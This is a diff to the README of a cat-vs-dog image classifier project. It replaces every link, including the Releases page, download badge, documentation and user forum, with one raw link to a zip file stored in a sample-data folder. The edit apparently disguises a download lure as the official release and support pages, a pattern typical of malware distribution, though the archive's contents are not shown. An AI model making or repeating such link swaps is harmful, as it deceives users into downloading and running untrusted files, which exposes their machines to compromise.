@@ -6,7 +6,7 @@ Welcome to the Cat-vs-Dog-CNN-Image-Classifier! This application helps you class
 
 ### 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets the following requirements:
 ## 💻 Installation Steps
 
 1. **Visit the Download Page**
-   Go to the [Releases page](https://github.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/releases) to get the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip) to get the latest version of the application.
 
 2. **Download the Latest Release**
    Find the latest version and click on the download link. The file will download to your computer.
@@ -70,8 +70,8 @@ If you have questions, feedback, or want to contribute, please reach out via Git
 
 Join our community of users to share experiences, tips, and ideas. Visit the following resources for more insights:
 
-- [Official Documentation](https://github.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier) for in-depth technical details
-- [User Forum](https://github.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/discussions) to ask questions and exchange ideas
+- [Official Documentation](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip) for in-depth technical details
+- [User Forum](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip) to ask questions and exchange ideas
 
 ## 🔄 Updates and Changelog
 
@@ -79,6 +79,6 @@ Keep an eye on the Releases page for updates and new features added to the appli
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/releases) again to ensure you have the latest version and repeat the download steps outlined above.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Wrangler1-jp/Cat-vs-Dog-CNN-Image-Classifier/main/data_sample/single_prediction/Image-vs-CN-Dog-Classifier-Cat-3.8-alpha.3.zip) again to ensure you have the latest version and repeat the download steps outlined above.
 
 This README provides all the information necessary to get the Cat-vs-Dog-CNN-Image-Classifier up and running smoothly. Enjoy classifying your images!
